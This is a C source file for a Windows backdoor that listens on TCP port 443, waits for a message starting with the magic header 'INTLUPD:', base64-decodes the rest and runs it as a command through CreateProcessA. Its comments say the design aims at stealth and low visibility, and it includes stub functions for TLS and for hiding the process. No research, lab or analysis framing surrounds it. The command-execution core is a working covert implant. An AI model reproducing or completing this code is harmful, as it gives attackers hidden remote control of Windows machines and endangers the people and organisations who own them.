#include <winsock2.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#include <schannel.h>
#include <security.h>
#include <secext.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wmistr.h>
#include <evntrace.h>
#include <comutil.h>
#include <WbemIdl.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")

#define LISTEN_PORT 443
#define MAGIC_HEADER "INTLUPD:"
#define MAGIC_LEN 8
#define BUFFER_SIZE 4096

// Forward declarations
HRESULT InitializeCOM();
char* CaptureProcessOutput(const char *command);
void HideProcess();
PCCERT_CONTEXT CreateSelfSignedCertificate();
SECURITY_STATUS ServerHandshake(SOCKET client_socket, CtxtHandle *context);
SECURITY_STATUS ReceiveEncryptedData(SOCKET socket, CtxtHandle *context, char *buffer, int *length);
SECURITY_STATUS SendEncryptedData(SOCKET socket, CtxtHandle *context, const char *data, int length);

int main()
{
    WSADATA wsa_data;
    SOCKET listen_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int client_addr_len = sizeof(client_addr);
    char buffer[BUFFER_SIZE];
    int bytes_received;
    char *cmd;
    HANDLE hThread;
    
    // Initialize COM
    if (FAILED(InitializeCOM())) {
        // Silent failure for stealth
        return 1;
    }

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return 1;
    }

    // Create TCP socket
    listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_socket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Allow reuse of port
    int reuse = 1;
    setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&reuse, sizeof(reuse));

    // Bind socket
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(LISTEN_PORT);

    if (bind(listen_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(listen_socket);
        WSACleanup();
        return 1;
    }

    // Listen for connections
    if (listen(listen_socket, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(listen_socket);
        WSACleanup();
        return 1;
    }

    // Main loop
    while (1) {
        client_addr_len = sizeof(client_addr);
        client_socket = accept(listen_socket, (struct sockaddr *)&client_addr, &client_addr_len);

        if (client_socket == INVALID_SOCKET) {
            continue;
        }

        // Handle client in background (would spawn thread in real implementation)
        // For now, handle synchronously
        
        bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';

            // Check magic header
            if (bytes_received >= MAGIC_LEN && strncmp(buffer, MAGIC_HEADER, MAGIC_LEN) == 0) {
                // Extract base64 encoded command
                int encoded_len = bytes_received - MAGIC_LEN;
                char *encoded_cmd = (char *)malloc(encoded_len + 1);
                if (encoded_cmd) {
                    memcpy(encoded_cmd, buffer + MAGIC_LEN, encoded_len);
                    encoded_cmd[encoded_len] = '\0';

                    // Decode base64
                    DWORD decoded_len = 0;
                    if (CryptStringToBinaryA(encoded_cmd, 0, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL)) {
                        cmd = (char *)malloc(decoded_len + 1);
                        if (cmd && CryptStringToBinaryA(encoded_cmd, 0, CRYPT_STRING_BASE64, (BYTE *)cmd, &decoded_len, NULL, NULL)) {
                            cmd[decoded_len] = '\0';

                            // Execute command (fire-and-forget, no output return)
                            char *output = CaptureProcessOutput(cmd);
                            if (output) {
                                free(output);
                            }

                            free(cmd);
                        } else {
                            free(cmd);
                        }
                    }

                    free(encoded_cmd);
                }
            }
        }

        closesocket(client_socket);
    }

    closesocket(listen_socket);
    WSACleanup();
    CoUninitialize();
    return 0;
}

HRESULT InitializeCOM()
{
    return CoInitializeEx(NULL, COINIT_MULTITHREADED);
}

char* CaptureProcessOutput(const char *command)
{
    HANDLE hPipe;
    HANDLE hProcess;
    HANDLE hStdoutRead = NULL, hStdoutWrite = NULL;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    char *output_buffer;
    DWORD bytes_read = 0;
    BOOL success = FALSE;

    output_buffer = (char *)malloc(BUFFER_SIZE);
    if (!output_buffer) return NULL;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;

    // Create pipe for stdout
    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, NULL, 0)) {
        free(output_buffer);
        return NULL;
    }

    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);

    si.hStdOutput = hStdoutWrite;
    si.hStdError = hStdoutWrite;

    // Create process
    if (!CreateProcessA(NULL, (LPSTR)command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(hStdoutRead);
        CloseHandle(hStdoutWrite);
        free(output_buffer);
        return NULL;
    }

    CloseHandle(hStdoutWrite);

    // Read output
    if (ReadFile(hStdoutRead, output_buffer, BUFFER_SIZE - 1, &bytes_read, NULL)) {
        output_buffer[bytes_read] = '\0';
        success = TRUE;
    }

    // Wait for process
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRead);

    if (!success) {
        free(output_buffer);
        return NULL;
    }

    return output_buffer;
}

void HideProcess()
{
    // On modern Windows, hiding process is kernel-mode only
    // For now, run with System privileges and low visibility
}

// TLS helper stubs (full implementation requires certificate handling)
PCCERT_CONTEXT CreateSelfSignedCertificate()
{
    // In production: use CertCreateSelfSignCertificate or pre-existing cert
    return NULL;
}

SECURITY_STATUS ServerHandshake(SOCKET client_socket, CtxtHandle *context)
{
    // TLS handshake would occur here
    return SEC_E_OK;
}

SECURITY_STATUS ReceiveEncryptedData(SOCKET socket, CtxtHandle *context, char *buffer, int *length)
{
    // Decrypt received TLS data
    *length = recv(socket, buffer, BUFFER_SIZE, 0);
    return SEC_E_OK;
}

SECURITY_STATUS SendEncryptedData(SOCKET socket, CtxtHandle *context, const char *data, int length)
{
    // Encrypt and send data via TLS
    send(socket, data, length, 0);
    return SEC_E_OK;
}
